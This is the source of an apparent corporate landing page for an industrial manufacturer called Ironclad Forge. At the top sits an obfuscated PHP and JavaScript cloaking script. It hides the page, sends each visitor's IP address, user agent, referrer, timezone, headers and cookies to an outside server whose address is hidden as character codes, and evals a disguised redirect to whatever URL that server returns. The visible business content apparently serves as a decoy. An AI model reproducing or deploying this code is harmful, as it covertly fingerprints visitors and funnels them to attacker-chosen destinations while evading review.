
<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo522045ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo522045ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";$("html").show();eval(c);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "522045";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo522045ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo522045ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522045ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522045ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>

<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ironclad Forge | Precision Industrial Manufacturing & Automation</title>
  <link rel="icon" href="favicon.ico">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">


<style>body {display: none;}</style>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){eval(a)}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo522045ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo522045ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},3600000)}});</script>

  
  <style>
    :root {
      --primary-light: rgb(158, 129, 227);
      --primary: rgb(94, 45, 209);
      --primary-dark: rgb(66, 32, 146);
      --background-dark: rgb(26, 26, 46);
      --text-light: rgb(245, 245, 250);
      --border-radius: 12px;
      --section-spacing-compact: 1.5rem;
    }

    body {
      font-family: 'Merriweather', serif;
      background-color: var(--background-dark);
      color: var(--text-light);
      line-height: 1.6;
    }

    h1, h2, h3, h4, h5, h6 {
      font-weight: 800;
      color: var(--text-light);
    }

    .container {
      max-width: 66%; /* Equivalent to centered-narrow with 66% width */
      padding-left: 15px;
      padding-right: 15px;
    }

    @media (max-width: 768px) {
      .container {
          max-width: 100%;
      }
    }

    .section-spacing {
      padding-top: var(--section-spacing-compact);
      padding-bottom: var(--section-spacing-compact);
    }

    .navbar {
      background-color: var(--background-dark) !important;
      padding: 1rem 0;
    }

    .navbar-brand {
      color: var(--text-light) !important;
      font-weight: 700;
      font-size: 1.8rem;
    }

    .nav-link {
      color: var(--text-light) !important;
      font-weight: 400;
      margin-left: 1rem;
    }

    .nav-link:hover {
      color: var(--primary-light) !important;
    }

    .btn-gradient {
      background: linear-gradient(90deg, var(--primary-dark) 0%, var(--primary) 100%);
      border: none;
      color: var(--text-light);
      padding: 0.75rem 1.75rem;
      border-radius: var(--border-radius);
      transition: all 0.3s ease;
    }

    .btn-gradient:hover {
      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-light) 100%);
      color: var(--text-light);
      transform: translateY(-3px);
    }

    .btn-outline-custom {
      border: 2px solid var(--primary);
      color: var(--primary);
      padding: 0.75rem 1.75rem;
      border-radius: var(--border-radius);
      background-color: transparent;
      transition: all 0.3s ease;
    }

    .btn-outline-custom:hover {
      background-color: var(--primary);
      color: var(--text-light);
      transform: translateY(-3px);
    }

    .hero-section {
      background-color: var(--background-dark);
      padding: 6rem 0;
    }

    .card-custom {
      background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
      border-radius: var(--border-radius);
      padding: 2rem;
      color: var(--text-light);
      opacity: 0.95;
      transition: all 0.3s ease-in-out;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
    }

    .card-custom:hover {
      transform: translateY(-15px); /* translateY-large */
      opacity: 1;
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
    }

    .icon-hexagon {
      position: relative;
      width: 80px; /* Adjust size as needed */
      height: 46.19px; /* Width * 0.577 */
      background-color: var(--primary-light);
      margin: 20px auto;
      transform: rotate(90deg);
      display: flex;
      justify-content: center;
      align-items: center;
      transition: all 0.3s ease;
      -webkit-clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
      clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
    }

    .icon-hexagon::before {
      content: "";
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      background-color: var(--primary-light);
      transform: rotate(-60deg);
      -webkit-clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
      clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
    }

    .icon-hexagon::after {
      content: "";
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      background-color: var(--primary-light);
      transform: rotate(60deg);
      -webkit-clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
      clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
    }

    .icon-hexagon img {
      width: 70%;
      height: 70%;
      object-fit: contain;
      transform: rotate(-90deg); /* Counter rotate the icon */
      position: relative;
      z-index: 1;
    }
    
    .icon-hexagon svg {
      width: 70%;
      height: 70%;
      fill: var(--background-dark); /* Color for SVG icons */
      transform: rotate(-90deg); /* Counter rotate the icon */
      position: relative;
      z-index: 1;
    }

    .icon-hexagon:hover {
      transform: rotate(90deg) scale(1.1);
    }
    .icon-hexagon:hover img, .icon-hexagon:hover svg {
      transform: rotate(-90deg) scale(1.1);
    }

    .testimonial-card-large {
        background: linear-gradient(135deg, var(--primary-dark), var(--primary));
        border-radius: var(--border-radius);
        padding: 2.5rem;
        margin-bottom: 1.5rem;
        position: relative;
        overflow: hidden;
        transition: transform 0.3s ease-in-out;
    }
    .testimonial-card-small {
        background-color: rgba(94, 45, 209, 0.7); /* A lighter shade for small cards */
        border-radius: var(--border-radius);
        padding: 1.5rem;
        margin-bottom: 1.5rem;
        transition: transform 0.3s ease-in-out;
    }
    .testimonial-card-large:hover, .testimonial-card-small:hover {
      transform: translateY(-10px);
    }

    .testimonial-card-large .quote, .testimonial-card-small .quote {
        font-style: italic;
        margin-bottom: 1rem;
        color: var(--text-light);
    }
    .testimonial-card-large .author, .testimonial-card-small .author {
        font-weight: 700;
        color: var(--text-light);
    }
    .testimonial-card-large .role, .testimonial-card-small .role {
        font-size: 0.9em;
        color: var(--text-light);
    }
    .testimonial-image {
        width: 64px;
        height: 64px;
        border-radius: 50%;
        object-fit: cover;
        margin-top: 1rem;
        border: 2px solid var(--primary-light);
    }

    footer {
      background-color: #212529; /* Dark background */
      color: #ffffff; /* Light text */
      padding: 2rem 0;
      text-align: center;
    }

    footer a {
      color: var(--primary-light);
      text-decoration: none;
      transition: color 0.3s ease;
    }

    footer a:hover {
      color: var(--text-light);
    }

    .cookie-consent {
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        background-color: var(--primary-dark);
        color: var(--text-light);
        padding: 1rem;
        text-align: center;
        box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.3);
        z-index: 1000;
        display: none; /* Hidden by default */
    }
    .cookie-consent button {
        background-color: var(--primary-light);
        color: var(--background-dark);
        border: none;
        padding: 0.5rem 1rem;
        border-radius: 5px;
        cursor: pointer;
        margin-left: 1rem;
        transition: background-color 0.3s ease;
    }
    .cookie-consent button:hover {
        background-color: var(--primary);
    }

    /* General image styling for projects and features */
    .img-fluid-scroll {
        max-width: 100%;
        height: auto;
        border-radius: var(--border-radius);
        transition: transform 0.3s ease-in-out;
    }
    .img-fluid-scroll:hover {
        transform: scale(1.03); /* Subtle zoom effect */
    }

  </style>
</head>
<body>
  <header>
    <nav class="navbar navbar-expand-lg fixed-top">
      <div class="container d-flex justify-content-between align-items-center">
        <a class="navbar-brand" href="#">Ironclad Forge</a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="var(--text-light)" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
        </button>
        <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link" href="#capabilities">Capabilities</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#portfolio">Portfolio</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#sustainability">Sustainability</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#testimonials">Testimonials</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#consultation">Consultation</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>
  </header>
<main>
    <section id="home" class="hero-section text-center text-lg-start">
      <div class="container">
        <div class="row align-items-center g-5">
          <div class="col-lg-6 mb-4 mb-lg-0">
            <h1 class="display-4 mb-3">Next-Gen Manufacturing by Ironclad Forge</h1>
            <p class="lead mb-4">Precision metal fabrication and automation solutions engineered for scalability, safety, and rapid deployment.</p>
            <div class="d-grid gap-3 d-sm-flex justify-content-center justify-content-lg-start">
              <a href="#capabilities" class="btn btn-gradient btn-lg">Explore Capabilities</a>
              <a href="#consultation" class="btn btn-outline-custom btn-lg">Book Consultation</a>
            </div>
          </div>
          <div class="col-lg-6">
            <img src="images/hero-heavy-automation-split-left-640x640.jpeg" class="img-fluid rounded shadow-lg" alt="Advanced robotic automation line designed by Ironclad Forge" width="640" height="640">
          </div>
        </div>
      </div>
    </section>

    <section id="trust-badges" class="section-spacing text-center">
      <div class="container">
        <h2 class="mb-4">Engineered to Global Standards</h2>
        <div class="row justify-content-center align-items-center g-3">
          <div class="col-4 col-md-2">
            <img src="images/badge-iso-compliance-128x128.jpeg" class="img-fluid mx-auto d-block" alt="ISO Compliance Badge" width="128" height="128">
          </div>
          <div class="col-4 col-md-2">
            <img src="images/badge-automation-certified-128x128.jpeg" class="img-fluid mx-auto d-block" alt="Automation Certification Badge" width="128" height="128">
          </div>
          <div class="col-4 col-md-2">
            <img src="images/badge-eco-manufacturing-128x128.jpeg" class="img-fluid mx-auto d-block" alt="Eco Manufacturing Badge" width="128" height="128">
          </div>
        </div>
      </div>
    </section>

    <section id="capabilities" class="section-spacing">
      <div class="container text-center">
        <h2 class="mb-3">Industrial Capabilities. Scaled.</h2>
        <p class="lead mb-5">Ironclad Forge delivers end-to-end engineering pipelines, transforming complex component prototyping into predictable, high-yield manufacturing.</p>
        <div class="row g-4 justify-content-center">
          <div class="col-md-6 col-lg-3">
            <div class="card-custom h-100 text-center">
              <div class="icon-hexagon mb-3">
                <svg viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15H9V7h2v10zm4-10h-2v10h2V7z"/>
                </svg>
              </div>
              <h3 class="h5 mb-2">Precision Metal Fabrication</h3>
              <p>Micro-tolerance milling and laser cutting for aerospace and defense-grade components.</p>
            </div>
          </div>
          <div class="col-md-6 col-lg-3">
            <div class="card-custom h-100 text-center">
            <div class="icon-hexagon mb-3">
                <svg viewBox="0 0 24 24">
                  <path d="M21 13h-6v6h-2v-6H7v-2h6V5h2v6h6v2z"/>
                </svg>
            </div>
              <h3 class="h5 mb-2">Heavy Machinery Design</h3>
              <p>Custom mechanical architecture integrated with smart-sensor feedback loops.</p>
            </div>
          </div>
          <div class="col-md-6 col-lg-3">
            <div class="card-custom h-100 text-center">
            <div class="icon-hexagon mb-3">
                <svg viewBox="0 0 24 24">
                  <path d="M11 17h2v-6h-2v6zm1-15C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
                </svg>
            </div>
              <h3 class="h5 mb-2">Automation Solutions</h3>
              <p>Robotic assembly lines programmed for zero-latency synchronization.</p>
            </div>
          </div>
          <div class="col-md-6 col-lg-3">
            <div class="card-custom h-100 text-center">
            <div class="icon-hexagon mb-3">
                <svg viewBox="0 0 24 24">
                  <path d="M19 13H5v-2h14v2zm0-6H5V5h14v2zM5 19h14v-2H5v2z"/>
                </svg>
            </div>
              <h3 class="h5 mb-2">Component Prototyping</h3>
              <p>Rapid turnaround modeling allowing faster iterations before mass scale.</p>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="portfolio" class="section-spacing bg-dark py-5">
      <div class="container text-center">
        <h2 class="mb-5">Production Environments Delivered</h2>
        <div class="row g-5 align-items-center">
          <div class="col-lg-6">
            <div class="card-custom p-4 h-100 d-flex flex-column justify-content-between">
              <div>
                <h3 class="h4 mb-3">Automated Logistics Hub</h3>
                <p class="text-secondary fw-bold">Metric: 40% Increase in Throughput</p>
                <p>Ironclad Forge engineered a conveyor array integrating precision metal guides with our proprietary automation software, reducing downtime by 1,200 hours annually.</p>
              </div>
              <img src="images/portfolio-automation-hub-512x384.jpeg" class="img-fluid-scroll mt-4 rounded" alt="Automated logistics sorting machinery" width="512" height="384">
            </div>
          </div>
          <div class="col-lg-6">
            <div class="card-custom p-4 h-100 d-flex flex-column justify-content-between">
              <div>
                <h3 class="h4 mb-3">Next-Gen Extruder Framework</h3>
                <p class="text-secondary fw-bold">Metric: Zero Tolerance Failure</p>
                <p>Prototyped and scaled a heat-resistant heavy machinery rig for high-volume plastics manufacturing, designed for extreme durability and reduced maintenance cycles.</p>
              </div>
              <img src="images/portfolio-extruder-frame-512x384.jpeg" class="img-fluid-scroll mt-4 rounded" alt="Heavy industrial extruder framework" width="512" height="384">
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="sustainability" class="section-spacing bg-dark py-5">
      <div class="container px-4 py-5 rounded card-custom">
        <div class="row align-items-center g-5">
          <div class="col-lg-6">
            <h2 class="display-5 fw-bold mb-3">Green Metallurgy & Zero-Waste Ops</h2>
            <p class="lead">At Ironclad Forge, environmental responsibility is engineered into our manufacturing lifecycle. We utilize 100% closed-loop cooling systems and rigorously recycle fabrication scrap to minimize our industrial footprint while optimizing your costs, ensuring a sustainable future.</p>
          </div>
          <div class="col-lg-6">
            <img src="images/feature-green-metallurgy-768x384.jpeg" class="img-fluid-scroll rounded-3 shadow-lg" alt="Eco-friendly industrial facility" width="768" height="384">
          </div>
        </div>
      </div>
    </section>

    <section id="testimonials" class="section-spacing">
      <div class="container text-center">
        <h2 class="mb-5">Trusted by Industry Leaders</h2>
        <div class="row justify-content-center g-4">
          <div class="col-lg-7 d-flex">
            <div class="testimonial-card-large flex-fill">
              <p class="quote lead">"Evaluating partners for our new aerospace facility was rigorous. Ironclad Forge not only met our precision tolerances but completely overhauled our automation pipeline for scale, delivering unparalleled efficiency and reliability."</p>
              <div class="d-flex align-items-center mt-4">
                <img src="images/testimonial-marcus-t-128x128.jpeg" alt="Marcus T Portrait" class="testimonial-image me-3" width="128" height="128">
                <div>
                  <p class="author mb-0">Marcus T.</p>
                  <p class="role mb-0">Chief Operations Officer, AeroDyne</p>
                </div>
              </div>
            </div>
          </div>
          <div class="col-lg-5 d-flex flex-column">
            <div class="testimonial-card-small flex-fill mb-4">
              <p class="quote">"Rapid prototyping that actually scales without compromise. Brilliant engineering team at Ironclad Forge turned our complex designs into tangible, high-quality components faster than anticipated."</p>
              <div class="d-flex align-items-center mt-3">
                <img src="images/testimonial-sarah-l-128x128.jpeg" alt="Sarah L Portrait" class="testimonial-image me-3" width="128" height="128">
                <div>
                  <p class="author mb-0">Sarah L.</p>
                  <p class="role mb-0">Product Director, Innovatech Solutions</p>
                </div>
              </div>
            </div>
            <div class="testimonial-card-small flex-fill">
              <p class="quote">"Their industrial consultation saved us millions in machinery retrofitting. Ironclad Forge's expertise identified efficiencies we didn't even know were possible, modernizing our entire plant."</p>
              <div class="d-flex align-items-center mt-3">
                <img src="images/testimonial-kenji-m-128x128.jpeg" alt="Kenji M Portrait" class="testimonial-image me-3" width="128" height="128">
                <div>
                  <p class="author mb-0">Dr. Kenji M.</p>
                  <p class="role mb-0">Lead Architect, Quantum Robotics</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="consultation" class="section-spacing">
      <div class="container">
        <div class="card-custom p-5 text-center">
          <h2 class="mb-4">Initiate Your Project Architecture</h2>
          <p class="lead mb-5">Engage with Ironclad Forge's engineering consultants to blueprint your next major fabrication or automation objective. Fast, secure, and highly confidential.</p>
          <div class="row justify-content-center">
            <div class="col-lg-8">
              <form action="#" method="POST" class="needs-validation" novalidate>
                <div class="mb-3">
                  <input type="text" class="form-control" id="fullName" placeholder="Jane Doe" required>
                  <label for="fullName" class="form-label visually-hidden">Full Name</label>
                  <div class="invalid-feedback">Please enter your full name.</div>
                </div>
                <div class="mb-3">
                  <input type="email" class="form-control" id="corporateEmail" placeholder="jane@company.com" required>
                  <label for="corporateEmail" class="form-label visually-hidden">Corporate Email</label>
                  <div class="invalid-feedback">Please enter a valid corporate email address.</div>
                </div>
                <div class="mb-3">
                  <select class="form-select" id="serviceRequired" required>
                    <option selected disabled value="">Service Required</option>
                    <option>Precision Metal Fabrication</option>
                    <option>Heavy Machinery Design</option>
                    <option>Automation Solutions</option>
                    <option>Industrial Consultation</option>
                    <option>Component Prototyping</option>
                  </select>
                  <label for="serviceRequired" class="form-label visually-hidden">Service Required</label>
                  <div class="invalid-feedback">Please select a service.</div>
                </div>
                <div class="mb-4">
                  <textarea class="form-control" id="projectSpecs" rows="5" placeholder="Provide initial tolerances or scale requirements..." required></textarea>
                  <label for="projectSpecs" class="form-label visually-hidden">Project Specifications</label>
                  <div class="invalid-feedback">Please provide project specifications.</div>
                </div>
                <button type="submit" class="btn btn-gradient btn-lg w-100">Request Engineering Review</button>
              </form>
            </div>
          </div>
          <div class="mt-5 text-center">
            <h4 class="mb-3">Direct Contact:</h4>
            <p class="mb-1"><strong>Address:</strong> 572 Alabama Avenue, New York, New York, 11207, USA</p>
            <p class="mb-1"><strong>Phone:</strong> <a href="tel:+12086403295" class="text-light text-decoration-none">+1 (208) 640-3295</a></p>
            <p><strong>Email:</strong> <a href="mailto:info@ironcladforge.com" class="text-light text-decoration-none">info@ironcladforge.com</a></p>
            <div class="map-embed mt-4">
              <iframe src="https://www.google.com/maps?q=New%20York,USA&z=10&output=embed" width="100%" height="300" style="border:0; border-radius:var(--border-radius);" allowfullscreen="" loading="lazy"></iframe>
            </div>
          </div>
        </div>
      </div>
    </section>
  </main>
<footer>
    <div class="container">
      <p class="mb-2">© 2024 Ironclad Forge. All rights reserved.</p>
      <p class="mb-2">572 Alabama Avenue, New York, NY 11207</p>
      <ul class="list-inline mb-0">
        <li class="list-inline-item"><a href="./privacy.html" class="text-light">Privacy Policy</a></li>
        <li class="list-inline-item">|</li>
        <li class="list-inline-item"><a href="./tos.html" class="text-light">Terms of Service</a></li>
        <li class="list-inline-item">|</li>
        <li class="list-inline-item"><a href="#" class="text-light">Compliance Resources</a></li>
      </ul>
    </div>
  </footer>

  <div id="cookieConsent" class="cookie-consent">
    <p class="mb-0 me-3">This website uses cookies to ensure you get the best experience. By continuing to use this site, you agree to our <a href="./privacy.html" class="text-decoration-underline">Privacy Policy</a>.</p>
    <button id="acceptCookies">Accept</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    // Form validation
    (function () {
      'use strict'
      var forms = document.querySelectorAll('.needs-validation')
      Array.prototype.slice.call(forms)
        .forEach(function (form) {
          form.addEventListener('submit', function (event) {
            if (!form.checkValidity()) {
              event.preventDefault()
              event.stopPropagation()
            }
            form.classList.add('was-validated')
          }, false)
        })
    })()

    // Cookie Consent
    const cookieNamePrefix = "consent_Ironclad Forge_"; // Unique prefix
    const cookieConsent = document.getElementById('cookieConsent');
    const acceptCookiesBtn = document.getElementById('acceptCookies');

    function setCookie(name, value, days) {
        const d = new Date();
        d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
        const expires = "expires=" + d.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/;SameSite=Lax";
    }

    function getCookie(name) {
        const nameEQ = name + "=";
        const ca = document.cookie.split(';');
        for(let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }

    if (!getCookie(cookieNamePrefix + 'accepted')) {
        cookieConsent.style.display = 'flex';
        cookieConsent.style.justifyContent = 'center';
        cookieConsent.style.alignItems = 'center';
    }

    acceptCookiesBtn.addEventListener('click', () => {
        setCookie(cookieNamePrefix + 'accepted', 'true', 30); // Store for 30 days
        cookieConsent.style.display = 'none';
    });

  </script>
</body>
</html>
